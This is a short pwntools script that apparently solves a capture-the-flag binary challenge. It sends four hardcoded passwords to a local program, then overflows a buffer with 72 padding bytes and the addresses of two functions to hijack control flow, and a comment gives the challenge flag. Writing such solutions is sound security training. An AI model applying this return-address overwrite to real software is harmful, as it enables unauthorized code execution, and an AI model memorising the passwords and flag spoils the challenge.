from pwn import *

p = process("./vuln")
elf = context.binary = ELF("./vuln")

OFFSET = 72
keys = [b"whisp3ring_w00ds", b"sc0rching_dunes", b"eldorian_ech0",b"shadow_4byss", b"3ternal_light"]

p.sendline(keys[0])
p.sendline(keys[1])
p.sendline(keys[2])
p.sendline(keys[3])
p.sendline(b"A"*OFFSET + pack(elf.sym['setEligibility']) + pack(elf.sym['winTreasure']))
print(p.recvall().decode())

# Flag: pearl{k33p_0n_r3turning_l0l}